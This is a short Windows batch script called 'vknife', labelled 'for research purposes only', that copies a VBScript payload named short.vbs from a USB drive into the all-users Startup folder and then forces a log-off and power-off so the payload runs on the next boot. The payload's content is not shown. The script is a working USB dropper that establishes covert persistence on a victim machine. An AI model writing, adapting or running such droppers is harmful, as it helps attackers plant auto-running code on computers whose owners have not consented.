REM +++++++++++++++++
REM |    vknife     |
REM +++++++++++++++++
REM For resarch porposes only

REM test sources, bc we dont know what the USB drive will be named by the system
xcopy /s D:\short.vbs "c:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp"
xcopy /s E:\short.vbs "c:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp"
xcopy /s F:\short.vbs "c:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp"
xcopy /s G:\short.vbs "c:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp"

REM this shouldnt happen but if the drive is named weird
xcopy /s A:\short.vbs "c:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp"
xcopy /s B:\short.vbs "c:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp"

REM then reboot system to run the startup applications
shutdown /l
shutdown /p

